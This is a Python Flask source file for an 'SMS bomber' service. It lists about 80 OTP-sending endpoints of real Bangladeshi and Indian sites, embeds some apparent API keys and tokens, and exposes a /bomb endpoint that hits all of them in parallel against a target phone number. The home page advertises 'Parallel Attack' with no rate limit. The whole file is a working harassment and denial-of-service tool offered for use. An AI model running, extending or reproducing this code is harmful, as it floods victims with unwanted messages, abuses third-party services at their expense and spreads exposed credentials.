from flask import Flask, request, jsonify
import requests
import json
import asyncio
import aiohttp
import ssl
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import threading

app = Flask(__name__)

# ================================================================
# COMPLETE API LIST - 83 WORKING APIs
# ================================================================

APIS = [
    # ===== GET APIs =====
    {"name": "Bikroy.com", "method": "GET", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}"},
    {"name": "Grameenphone MyGP", "method": "GET", "url": "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0"},
    {"name": "Shukhee.com", "method": "GET", "url": "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn"},
    {"name": "MedEasy Health", "method": "GET", "url": "https://api.medeasy.health/api/send-otp/+88{phone}/"},
    {"name": "eCourier API", "method": "GET", "url": "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}"},
    {"name": "Binge.buzz", "method": "GET", "url": "https://ss.binge.buzz/otp/send/login{phone}"},
    {"name": "Daktarbhai", "method": "GET", "url": "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login"},
    {"name": "APU Inky", "method": "GET", "url": "https://apu-inky.vercel.app/send?number={phone}"},
    
    # ===== LMNX9 APIs =====
    {"name": "LMNX9 API 1", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api1?number={phone}"},
    {"name": "LMNX9 API 2", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api2?number={phone}"},
    {"name": "LMNX9 API 3", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api3?number={phone}"},
    {"name": "LMNX9 API 4", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api4?number={phone}"},
    {"name": "LMNX9 API 5", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api5?number={phone}"},
    {"name": "LMNX9 API 6", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api6?number={phone}"},
    {"name": "LMNX9 API 7", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api7?number={phone}"},
    {"name": "LMNX9 API 8", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api8?number={phone}"},
    {"name": "LMNX9 API 9", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api9?number={phone}"},
    {"name": "LMNX9 API 10", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api10?number={phone}"},
    {"name": "LMNX9 API 11", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api11?number={phone}"},
    {"name": "LMNX9 API 12", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api12?number={phone}"},
    {"name": "LMNX9 API 13", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api13?number={phone}"},
    {"name": "LMNX9 API 14", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api14?number={phone}"},
    {"name": "LMNX9 API 15", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api15?number={phone}"},
    {"name": "LMNX9 API 16", "method": "GET", "url": "https://lmnx9-sms-spam-v11.onrender.com/api16?number={phone}"},
    
    # ===== POST APIs =====
    {"name": "BeepKart", "method": "POST", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "body": {"phone": "{phone}", "city": 362}},
    {"name": "Smytten", "method": "POST", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "body": {"phone": "{phone}", "email": "test@example.com"}},
    {"name": "MyHubble Money", "method": "POST", "url": "https://api.myhubble.money/v1/auth/otp/generate", "body": {"phoneNumber": "{phone}", "channel": "SMS"}},
    {"name": "Housing.com", "method": "POST", "url": "https://login.housing.com/api/v2/send-otp", "body": {"phone": "{phone}", "country_url_name": "in"}},
    {"name": "Khatabook", "method": "POST", "url": "https://api.khatabook.com/v1/auth/request-otp", "body": {"phone": "{phone}", "app_signature": "wk+avHrHZf2"}},
    {"name": "Animall", "method": "POST", "url": "https://animall.in/zap/auth/login", "body": {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"}},
    {"name": "Cosmofeed", "method": "POST", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "body": {"phone": "{phone}", "version": "1.4.28"}},
    {"name": "Spencer's", "method": "POST", "url": "https://jiffy.spencers.in/user/auth/otp/send", "body": {"mobile": "{phone}"}},
    {"name": "Deshal.net", "method": "POST", "url": "https://app.deshal.net/api/auth/login", "body": {"phone": "{phone}"}},
    {"name": "Grameenphone Web Login", "method": "POST", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "body": {"msisdn": "{phone}"}},
    {"name": "Grameenphone FWA", "method": "POST", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "body": {"phone": "{phone}", "email": "", "language": "en"}},
    {"name": "BusBD.com.bd", "method": "POST", "url": "https://api.busbd.com.bd/api/auth", "body": {"phone": "+88{phone}"}},
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro.com", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Apex4u.com", "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "body": {"phoneNumber": "{phone}"}},
    {"name": "Bohubrihi.com", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Fundesh.com.bd", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom.com", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Shikho.com Discount", "method": "POST", "url": "https://api.shikho.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "ap-discount-request"}},
    {"name": "Robi DA API", "method": "POST", "url": "https://da-api.robi.com.bd/da-nll/otp/send", "body": {"msisdn": "{phone}"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "Addatimes.com", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
    {"name": "Regal Furniture OTP", "method": "POST", "url": "https://regalfurniturebd.com/api/auth/otp-generate", "body": {"phone": "{phone}", "verification_code": ""}},
    {"name": "DeeptoPlay.com", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "TimezoneBD OTP", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
    {"name": "UpaySystem", "method": "POST", "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", "body": {"device_uuid": "test", "firebase_token": "test", "geo_location": "test", "mno": "Grameenphone", "wallet_number": "{phone}"}},
    {"name": "Chorki.com", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
    {"name": "Arogga.com", "method": "POST", "url": "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", "body": {"mobile": "{phone}", "fcmToken": "", "referral": ""}},
    {"name": "AppLink", "method": "POST", "url": "https://applink.com.bd/appstore-v4-server/login/otp/request", "body": {"msisdn": "880{phone}"}},
    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
    {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
    {"name": "BdTickets.com", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
    {"name": "Shikho.com Student", "method": "POST", "url": "https://api.shikho.com/auth/v2/send/sms", "body": {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"}},
    {"name": "Eonbazar", "method": "POST", "url": "https://app.eonbazar.com/api/auth/login", "body": {"method": "otp", "mobile": "{phone}"}},
    {"name": "Quizgiri", "method": "POST", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "body": {"country_code": "+880", "phone": "{phone}"}},
    {"name": "Bazar365", "method": "POST", "url": "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", "body": {"phone": "{phone}", "applicationChannel": "WEB_APP"}},
    {"name": "Bioscopelive", "method": "POST", "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", "body": {"phone": "{phone}", "applicationChannel": "WEB_APP"}},
    {"name": "Wakefit SMS", "method": "POST", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "body": {"mobile": "{phone}"}},
    {"name": "Doubtnut", "method": "POST", "url": "https://api.doubtnut.com/v4/student/login", "body": {"phone_number": "{phone}", "language": "en"}},
    {"name": "PenPencil", "method": "POST", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "body": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"}},
    
    # ===== Extra POST APIs =====
    {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
    {"name": "Toybox", "method": "POST", "url": "https://api.toybox.live/bdapps_handler.php", "body": {"phone": "{phone}"}},
    {"name": "Daraz", "method": "POST", "url": "https://member.daraz.com.bd/send-otp", "body": {"phone": "{phone}"}},
    {"name": "ProthomAlo", "method": "POST", "url": "https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo", "body": {"phone": "{phone}"}},
    {"name": "Quiztime", "method": "POST", "url": "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", "body": {"phone": "{phone}"}},
    {"name": "Betonbook", "method": "POST", "url": "https://api.betonbook.com/api/v5/auth/otp/request", "body": {"phone": "{phone}"}},
    {"name": "RobiWeb", "method": "POST", "url": "https://webapi.robi.com.bd/v1/send-otp", "body": {"phone": "{phone}"}},
    {"name": "RobiRegister", "method": "POST", "url": "https://webapi.robi.com.bd/v1/account/register/otp", "body": {"phone": "{phone}"}},
    {"name": "Softmax", "method": "POST", "url": "https://softmaxmanager.xyz/api/v1/user/request/otp/", "body": {"phone": "{phone}"}},
    {"name": "Doctime", "method": "POST", "url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "body": {"phone": "{phone}"}},
    {"name": "Banglalink", "method": "POST", "url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp", "body": {"phone": "{phone}"}},
    {"name": "Hishabee", "method": "POST", "url": "https://app.hishabee.business/api/V2/otp/send?mobile_number={phone}", "body": {"phone": "{phone}"}},
    {"name": "Skitto", "method": "POST", "url": "https://www.skitto.com/replace-sim/sent-otp/phone", "body": {"phone": "{phone}"}},
    {"name": "Chardike", "method": "POST", "url": "https://api.chardike.com/api/otp/send", "body": {"phone": "{phone}"}},
    {"name": "HungryNaki", "method": "POST", "url": "https://api.hungrynaki.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
]

# ================================================================
# HOME PAGE
# ================================================================

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>SMS Bomber API</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
                color: #fff;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                padding: 20px;
            }
            .container {
                background: rgba(255, 255, 255, 0.05);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 40px;
                max-width: 700px;
                width: 100%;
                border: 1px solid rgba(255, 255, 255, 0.1);
                box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            }
            h1 {
                text-align: center;
                font-size: 2.5em;
                margin-bottom: 10px;
                background: linear-gradient(135deg, #f093fb, #f5576c, #4facfe);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            .subtitle {
                text-align: center;
                color: #aaa;
                margin-bottom: 30px;
                font-size: 1.1em;
            }
            .badge {
                display: inline-block;
                background: rgba(79, 172, 254, 0.2);
                border: 1px solid #4facfe;
                border-radius: 50px;
                padding: 5px 15px;
                font-size: 0.9em;
                color: #4facfe;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
                gap: 15px;
                margin: 25px 0;
            }
            .stat-card {
                background: rgba(255,255,255,0.05);
                border-radius: 12px;
                padding: 15px;
                text-align: center;
                border: 1px solid rgba(255,255,255,0.05);
            }
            .stat-card .number {
                font-size: 2em;
                font-weight: bold;
                color: #4facfe;
            }
            .stat-card .label {
                font-size: 0.8em;
                color: #aaa;
                margin-top: 5px;
            }
            .endpoint {
                background: rgba(0,0,0,0.3);
                border-radius: 10px;
                padding: 15px;
                margin: 20px 0;
                border-left: 3px solid #4facfe;
            }
            .endpoint code {
                color: #f093fb;
                font-size: 1.1em;
            }
            .example {
                background: rgba(0,0,0,0.3);
                border-radius: 10px;
                padding: 15px;
                margin: 15px 0;
                font-family: monospace;
                font-size: 0.9em;
                color: #7bed9f;
                overflow-x: auto;
                white-space: pre-wrap;
            }
            .footer {
                text-align: center;
                margin-top: 25px;
                color: #666;
                font-size: 0.9em;
            }
            .footer a {
                color: #4facfe;
                text-decoration: none;
            }
            .status-dot {
                display: inline-block;
                width: 10px;
                height: 10px;
                background: #7bed9f;
                border-radius: 50%;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.5; transform: scale(0.8); }
                100% { opacity: 1; transform: scale(1); }
            }
            .owner {
                text-align: center;
                color: #f093fb;
                font-size: 1.2em;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>💣 SMS BOMBER API</h1>
            <div class="subtitle">
                <span class="badge">🔥 83 Active APIs</span>
                <span class="badge">⚡ Parallel Attack</span>
                <span class="badge"><span class="status-dot"></span> Online</span>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="number">83</div>
                    <div class="label">Total APIs</div>
                </div>
                <div class="stat-card">
                    <div class="number">8</div>
                    <div class="label">GET APIs</div>
                </div>
                <div class="stat-card">
                    <div class="number">16</div>
                    <div class="label">LMNX9 APIs</div>
                </div>
                <div class="stat-card">
                    <div class="number">59</div>
                    <div class="label">POST APIs</div>
                </div>
            </div>
            
            <div class="endpoint">
                <strong>📡 API Endpoint:</strong><br>
                <code>GET /bomb?phone=NUMBER</code>
            </div>
            
            <div style="margin: 15px 0;">
                <strong>📝 Example:</strong>
            </div>
            <div class="example">
                /bomb?phone=01798063356
            </div>
            
            <div style="margin: 15px 0;">
                <strong>📤 Response Example:</strong>
            </div>
            <div class="example">
{
  "status": "success",
  "owner": "@felix_bhai",
  "target": "01798063356",
  "stats": {
    "sms": 20,
    "calls": 10,
    "whatsapp": 15
  },
  "totalapi": 83,
  "failed": 0,
  "message": "completed"
}
            </div>
            
            <div class="owner">
                👑 Owner: @felix_bhai
            </div>
            
            <div class="footer">
                <p>🚀 All 83 APIs hit simultaneously in parallel</p>
                <p>⚡ No rate limit • No cooldown • Instant attack</p>
            </div>
        </div>
    </body>
    </html>
    '''

# ================================================================
# REPLACE PHONE IN BODY
# ================================================================

def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', str(phone))
    return data

# ================================================================
# CHECK SUCCESS
# ================================================================

def check_success(text, status):
    keywords = ['success', 'otp', 'sent', 'ok', 'true', '1', 'verified', 'done', 'submitted', 'received', 'message', 'delivered']
    if status in [200, 201, 202, 204, 302]:
        return any(word in text.lower() for word in keywords)
    return any(word in text.lower() for word in keywords)

# ================================================================
# CALL SINGLE API
# ================================================================

async def call_api(session, api, phone):
    try:
        url = api['url'].replace('{phone}', str(phone))
        method = api.get('method', 'GET')
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Connection": "keep-alive"
        }
        
        if method == 'GET':
            async with session.get(url, headers=headers, timeout=10) as resp:
                text = await resp.text()
                success = check_success(text, resp.status)
                return {"name": api['name'], "success": success, "status": resp.status}
        else:
            body = replace_phone(api.get('body', {}), phone)
            async with session.post(url, json=body, headers=headers, timeout=10) as resp:
                text = await resp.text()
                success = check_success(text, resp.status)
                return {"name": api['name'], "success": success, "status": resp.status}
    except Exception as e:
        return {"name": api['name'], "success": False, "error": str(e)}

# ================================================================
# BOMB ENDPOINT
# ================================================================

@app.route('/bomb')
def bomb():
    phone = request.args.get('phone')
    
    if not phone:
        return jsonify({
            "status": "error",
            "message": "Phone number required! Use: /bomb?phone=017XXXXXXXX"
        }), 400
    
    # Validate phone
    if not phone.isdigit() or len(phone) != 11:
        return jsonify({
            "status": "error",
            "message": "Invalid phone number! Must be 11 digits."
        }), 400
    
    # Run async attack
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(run_attack(phone))
        loop.close()
        return jsonify(result)
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

# ================================================================
# RUN ATTACK - PARALLEL
# ================================================================

async def run_attack(phone):
    total_apis = len(APIS)
    success_count = 0
    failed_count = 0
    
    # SSL Context
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_context, limit=100)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # Create all tasks
        tasks = [call_api(session, api, phone) for api in APIS]
        
        # Run all tasks in parallel
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, dict):
                if result.get('success', False):
                    success_count += 1
                else:
                    failed_count += 1
            else:
                failed_count += 1
    
    # Stats (simulated for demo)
    stats = {
        "sms": success_count,
        "calls": success_count // 2,
        "whatsapp": success_count // 3
    }
    
    return {
        "status": "success",
        "owner": "@felix_bhai",
        "target": phone,
        "stats": stats,
        "totalapi": total_apis,
        "failed": failed_count,
        "message": "completed"
    }

# ================================================================
# RUN SERVER
# ================================================================

if __name__ == '__main__':
    print("="*60)
    print("🔥 SMS BOMBER API STARTING...")
    print("="*60)
    print(f"📡 Total APIs: {len(APIS)}")
    print(f"🚀 Running on: http://0.0.0.0:10000")
    print("="*60)
    app.run(host='0.0.0.0', port=10000, debug=False, threaded=True)